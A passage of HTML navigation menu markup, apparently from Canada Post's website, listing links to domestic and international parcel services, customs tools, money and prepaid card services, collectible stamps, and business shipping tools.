          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/expedited-usa.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/international-parcel.page?" class="" target="" alt="">International Parcel – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/international-parcel.page?" target="" alt="">
            <h3 class="submenu-header">International Parcel – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/personal/sending/parcels/compare-services-international/priority-worldwide.page?" class="" target="" alt="">Priority Worldwide</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/sending/parcels/compare-services-international/priority-worldwide.page?" target="" alt="">
            <h3 class="submenu-header">Priority Worldwide<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/wtz/business/landedCost" class="" target="" alt="">Estimate duties and taxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/wtz/business/landedCost" target="" alt="">
        <h3 class="submenu-header">Estimate duties and taxes<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/cdc" class="" target="" alt="">Complete customs form</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/cdc" target="" alt="">
        <h3 class="submenu-header">Complete customs form<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/sending/parcels/flat-rate-box.page?" class="" target="" alt="">Flat rate boxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/sending/parcels/flat-rate-box.page?" target="" alt="">
        <h3 class="submenu-header">Flat rate boxes<span class="open-new-window"></span></h3>
        <p>Purchase the box and included postage at the post office, ship anytime.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/sending/quick-tools.page?" class="menu-title parent-link" target="" alt="">Access our quick tools</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/sending/quick-tools.page?" target="" alt="">
          <h3 class="submenu-header">Access our quick tools<span class="open-new-window"></span></h3>
          <p>Learn about your favourite shipping tools.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//information/app/far/business/findARate" class="" target="" alt="">Find a rate</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/far/business/findARate" target="" alt="">
        <h3 class="submenu-header">Find a rate<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/tools/delivery-standards.page?" class="" target="" alt="">Find a delivery standard</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/tools/delivery-standards.page?" target="" alt="">
        <h3 class="submenu-header">Find a delivery standard<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//track-reperage/en" class="" target="" alt="">Track a package</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//track-reperage/en" target="" alt="">
        <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/fpo/personal/findpostoffice" class="" target="" alt="">Find a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/fpo/personal/findpostoffice" target="" alt="">
        <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find a postal code</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find a postal code<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/personal/money-government-services.page?" class="parent-link" target="" alt="">Money and government services</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/personal/money-government-services.page?" target="" alt="">
              <h3 class="submenu-header">Money and government services<span class="open-new-window"></span></h3>
                <p>Learn about money services and permits available at the post office.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/personal/money-government-services/send-money.page?" class="menu-title parent-link" target="" alt="">Send money</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/money-government-services/send-money.page?" target="" alt="">
          <h3 class="submenu-header">Send money<span class="open-new-window"></span></h3>
          <p>Learn about affordable money transfers and cashable money orders.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/money-government-services/send-money/money-orders.page?" class="" target="" alt="">Money orders</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/send-money/money-orders.page?" target="" alt="">
        <h3 class="submenu-header">Money orders<span class="open-new-window"></span></h3>
        <p>Send secure, cashable money orders from the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/money-government-services/send-money/international-money-transfers.page?" class="" target="" alt="">International money transfer (MoneyGram)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/send-money/international-money-transfers.page?" target="" alt="">
        <h3 class="submenu-header">International money transfer (MoneyGram)<span class="open-new-window"></span></h3>
        <p>Send affordable, international money transfers all over the world.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/money-government-services/manage-money.page?" class="menu-title parent-link" target="" alt="">Manage money</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money.page?" target="" alt="">
          <h3 class="submenu-header">Manage money<span class="open-new-window"></span></h3>
          <p>Learn about prepaid cards and ordering foreign currency.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards.page?" class="parent-link" target="" alt="">Prepaid reloadable cards</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid reloadable cards<span class="open-new-window"></span></h3>
        <p>Buy prepaid cards at the post office for shopping and travel.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard.page?" class="parent-link" target="" alt="">Mastercard</a>
          <div class="menu-item-level level4" data-level="5">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard.page?" target="" alt="">
            <h3 class="submenu-header">Mastercard<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/overview.page?" class="" target="" alt="">Get to know your card</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/overview.page?" target="" alt="">Get to know your card</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started.page?" class="" target="" alt="">How to get started</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started.page?" target="" alt="">How to get started</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works.page?" class="" target="" alt="">How it works</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works.page?" target="" alt="">How it works</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us.page?" class="" target="" alt="">Contact us</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us.page?" target="" alt="">Contact us</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/faq.page?" class="" target="" alt="">FAQ</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/faq.page?" target="" alt="">FAQ</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/prepaid-services-mobile-recharge.page?" class="" target="" alt="">Other prepaid services</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/prepaid-services-mobile-recharge.page?" target="" alt="">
        <h3 class="submenu-header">Other prepaid services<span class="open-new-window"></span></h3>
        <p>Buy calling cards and mobile recharge cards at the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/personal/money-government-services/manage-money/foreign-currency-delivery.page?" class="" target="" alt="">Foreign cash delivery</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/money-government-services/manage-money/foreign-currency-delivery.page?" target="" alt="">
        <h3 class="submenu-header">Foreign cash delivery<span class="open-new-window"></span></h3>
        <p>Order currency online for delivery to your home or the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/money-government-services/gift-cards.page?" class="menu-title " target="" alt="">Gift cards</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/money-government-services/gift-cards.page?" target="" alt="">
          <h3 class="submenu-header">Gift cards<span class="open-new-window"></span></h3>
          <p>Purchase gift cards at the post office.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/money-government-services/tax-forms-hunting-permit.page?" class="menu-title " target="" alt="">Government forms and permits</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/money-government-services/tax-forms-hunting-permit.page?" target="" alt="">
          <h3 class="submenu-header">Government forms and permits<span class="open-new-window"></span></h3>
          <p>Get migratory bird hunting permits at the post office.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="//cpc/en/personal/collectibles.page?" class="parent-link" target="" alt="">Collectible stamps and coins</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/personal/collectibles.page?" target="" alt="">
              <h3 class="submenu-header">Collectible stamps and coins<span class="open-new-window"></span></h3>
                <p>Learn about collectible stamps and access pictorial cancels.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/personal/collectibles/stamp-stories.page?" class="menu-title parent-link" target="" alt="">Canadian stamp stories</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/collectibles/stamp-stories.page?" target="" alt="">
          <h3 class="submenu-header">Canadian stamp stories<span class="open-new-window"></span></h3>
          <p>Tips and ideas on collecting stamps and coins.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/personal/collectibles/stamp-stories/details-magazine-collections-catalogue.page?" class="" target="" alt="">Details magazine collections catalogue</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/personal/collectibles/stamp-stories/details-magazine-collections-catalogue.page?" target="" alt="">
        <h3 class="submenu-header">Details magazine collections catalogue<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/collectibles/suggest-stamp.page?" class="menu-title " target="" alt="">Suggest a stamp</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/collectibles/suggest-stamp.page?" target="" alt="">
          <h3 class="submenu-header">Suggest a stamp<span class="open-new-window"></span></h3>
          <p>Send us your stamp theme ideas.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/personal/collectibles/pictorial-cancels.page?" class="menu-title " target="" alt="">Pictorial cancels</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/personal/collectibles/pictorial-cancels.page?" target="" alt="">
          <h3 class="submenu-header">Pictorial cancels<span class="open-new-window"></span></h3>
          <p>View available postal cancels and which post office offers them.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
       
        </ul>
        <ul id="mobile-nav-section-business" class="menu-primary-links" data-sitemap="business">
           
      <div class="menu-overview">
      <a class="parent-title" href="//cpc/en/business.page?" target="">
      <h3 class="submenu-header">Business<span class="open-new-window"></span></h3>
      <p>Learn about mailing services for businesses of all sizes.</p>
      </a>
      </div> 
      
          <li>
            <a href="//cpc/en/business/shipping.page?" class="parent-link" target="" alt="">Shipping</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="//cpc/en/business/shipping.page?" target="" alt="">
              <h3 class="submenu-header">Shipping<span class="open-new-window"></span></h3>
                <p>Learn about services and rates for Canadian and international shipping.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="//cpc/en/business/shipping/canada.page?" class="menu-title parent-link" target="" alt="">Ship in Canada</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/canada.page?" target="" alt="">
          <h3 class="submenu-header">Ship in Canada<span class="open-new-window"></span></h3>
          <p>Learn about domestic shipping services to suit your business needs.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/shipping/find-rates-ship.page?" class="parent-link" target="" alt="">Find a rate and ship</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship.page?" target="" alt="">
        <h3 class="submenu-header">Find a rate and ship<span class="open-new-window"></span></h3>
        <p>Learn about costs for small business and large volume shipping.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
            <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" class="" target="" alt="">Shipping Manager</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" target="" alt="">
            <h3 class="submenu-header">Shipping Manager<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/find-rates-ship/est-2.page?" class="" target="" alt="">EST 2.0</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/est-2.page?" target="" alt="">
            <h3 class="submenu-header">EST 2.0<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/canada/compare.page?" class="parent-link" target="" alt="">Compare shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/canada/compare.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services<span class="open-new-window"></span></h3>
        <p>Learn about domestic shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/shipping/canada/compare/regular.page?" class="" target="" alt="">Regular Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/canada/compare/regular.page?" target="" alt="">
            <h3 class="submenu-header">Regular Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/canada/compare/expedited.page?" class="" target="" alt="">Expedited Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/canada/compare/expedited.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/canada/compare/xpresspost.page?" class="" target="" alt="">Xpresspost</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/canada/compare/xpresspost.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/canada/compare/priority.page?" class="" target="" alt="">Priority</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/canada/compare/priority.page?" target="" alt="">
            <h3 class="submenu-header">Priority<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/restrictions.page?" class="parent-link" target="" alt="">View restrictions</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled item mail restrictions by country.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/shipping/restrictions/cannabis.page?" class="" target="" alt="">Cannabis</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/restrictions/cannabis.page?" target="" alt="">
            <h3 class="submenu-header">Cannabis<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/compare-shipping-tools.page?" class="" target="" alt="">Choose a shipping tool</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/compare-shipping-tools.page?" target="" alt="">
        <h3 class="submenu-header">Choose a shipping tool<span class="open-new-window"></span></h3>
        <p>Compare our 3 shipping tools to find the tool for your business.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/third-party-shipping-software.page?" class="" target="" alt=""> Third-party shipping software</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/third-party-shipping-software.page?" target="" alt="">
        <h3 class="submenu-header"> Third-party shipping software<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/shipping/international.page?" class="menu-title parent-link" target="" alt="">Ship internationally</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/international.page?" target="" alt="">
          <h3 class="submenu-header">Ship internationally<span class="open-new-window"></span></h3>
          <p>Learn about international shipping services for your business needs.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="//cpc/en/business/shipping/find-rates-ship.page?" class="parent-link" target="" alt="">Find a rate and ship</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship.page?" target="" alt="">
        <h3 class="submenu-header">Find a rate and ship<span class="open-new-window"></span></h3>
        <p>Learn about costs for small business and large volume shipping.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
            <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/find-rates-ship/est-2.page?" class="" target="" alt="">EST 2.0</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/find-rates-ship/est-2.page?" target="" alt="">
            <h3 class="submenu-header">EST 2.0<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/international/compare.page?" class="parent-link" target="" alt="">Compare shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/international/compare.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services<span class="open-new-window"></span></h3>
        <p>Learn about U.S. and international shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="//cpc/en/business/shipping/international/compare/small-packet-usa.page?" class="" target="" alt="">Small Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/small-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/small-packet-international.page?" class="" target="" alt="">Small Packet International – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/small-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet International – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/tracked-packet-usa.page?" class="" target="" alt="">Tracked Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/tracked-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/tracked-packet-international.page?" class="" target="" alt="">Tracked Packet – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/tracked-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/expedited-parcel-usa.page?" class="" target="" alt="">Expedited Parcel – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/expedited-parcel-usa.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/international-parcel.page?" class="" target="" alt="">International Parcel – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/international-parcel.page?" target="" alt="">
            <h3 class="submenu-header">International Parcel – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/xpresspost-usa.page?" class="" target="" alt="">Xpresspost – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/xpresspost-usa.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/xpresspost-international.page?" class="" target="" alt="">Xpresspost – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/xpresspost-international.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="//cpc/en/business/shipping/international/compare/priority-worldwide.page?" class="" target="" alt="">Priority Worldwide</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="//cpc/en/business/shipping/international/compare/priority-worldwide.page?" target="" alt="">
            <h3 class="submenu-header">Priority Worldwide<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/restrictions.page?" class="" target="" alt="">View restrictions</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled restrictions by country</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/wtz/business/landedCost" class="" target="" alt="">Estimate duties and taxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/wtz/business/landedCost" target="" alt="">
        <h3 class="submenu-header">Estimate duties and taxes<span class="open-new-window"></span></h3>
        <p>Estimate duties and taxes</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/wtz/business/findHsCode" class="" target="" alt="">Find customs codes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/wtz/business/findHsCode" target="" alt="">
        <h3 class="submenu-header">Find customs codes<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//information/app/cdc" class="" target="" alt="">Complete customs form</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//information/app/cdc" target="" alt="">
        <h3 class="submenu-header">Complete customs form<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="//cpc/en/business/shipping/compare-shipping-tools.page?" class="" target="" alt="">Choose a shipping tool</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="//cpc/en/business/shipping/compare-shipping-tools.page?" target="" alt="">
        <h3 class="submenu-header">Choose a shipping tool<span class="open-new-window"></span></h3>
        <p>Compare our 3 shipping tools to find the tool for your business.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="//cpc/en/business/shipping/track-find.page?" class="menu-title parent-link" target="" alt="">Track and find</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="//cpc/en/business/shipping/track-find.page?" target="" alt="">
          <h3 class="submenu-header">Track and find<span class="open-new-window"></span></h3>
